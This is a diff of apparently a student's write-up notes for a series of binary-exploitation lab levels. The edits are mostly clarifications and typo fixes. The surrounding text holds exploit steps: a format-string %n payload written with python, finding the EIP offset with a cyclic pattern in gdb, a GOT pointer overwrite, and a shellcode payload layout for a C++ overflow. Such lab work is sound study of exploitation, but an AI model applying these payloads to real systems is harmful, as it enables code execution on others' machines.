@@ -153,7 +153,7 @@ replace it with the address of m (little-endian)
 python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit3
 
 but we need to change the value, not just print the address. so the address is already 4 bytes, and it needs to be 64, so we can just add 60 bytes. We can precise which adress we adding this to with %[nb]$n, so at the 4th address is %4$n.
-
+The modifier %n will write the number of bytes specified before in the choosen address. We can specify the address with %[number]$n option.
 
 python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' > /tmp/exploit3
 
@@ -252,8 +252,6 @@ first need to find the offset of eip
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 with this tool, we can generate a pattern to determine the offset
 
-
-
 gdb ./level6
 run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
@@ -303,7 +301,7 @@ paste this address 0x37614136 : offset is 20 ! (cause its this one which will be
 let's get the puts GOT address in gdb. (the pointer to overwrite)
 0x08048400
 \x00\x84\x04\x08 NOPE NO THIS ONE
-Cause we need not to overwrite the entire address of puts, but the pointer address only !
+Cause we dont need to overwrite the entire address of puts, but the pointer address only !
 
 so gdb ./level7 - info functions puts then get the adress and disassemble it
 disass 0x08048400
@@ -359,8 +357,9 @@ level9 :
 we can see in the binary that there is a class N, containing multiples functions attributes.
 it is in cpp, so theres no /bin/sh calls, we have to use a shellcode.
 
-the only intersting function is probably the setAnnotation(char*) that gets called at the end of main.
+the only interesting function is probably the setAnnotation(char*) that gets called at the end of main.
 it uses memcpy, and because it takes the arg of argv[1] for strlen, so we should use that memcpy to calls edx which will call our shellcode.
+So our goal is to replace the address pointed by the edx register (which gets called in operator - and +) by our shellcode.
 
 lets find the offset of eax :
 
@@ -389,7 +388,7 @@ Breakpoint 1, 0x0804867c in main ()
 the value of 'esp+0x10' will be replaced with 0x804a00c. We need to dereference again, this address will points the begining of our shellcode : 0x804a00x + 4 = 0x804a010
 
 
-	  \x10\xa0\x04\x08		     \x0c\xa0\x04\x08
+	       \x10\xa0\x04\x08		               \x0c\xa0\x04\x08
 payload : shell_addr + shellcode + padding + buffer_addr  
 	  4b           28b         76b        4b         = 108 + 4
 	  
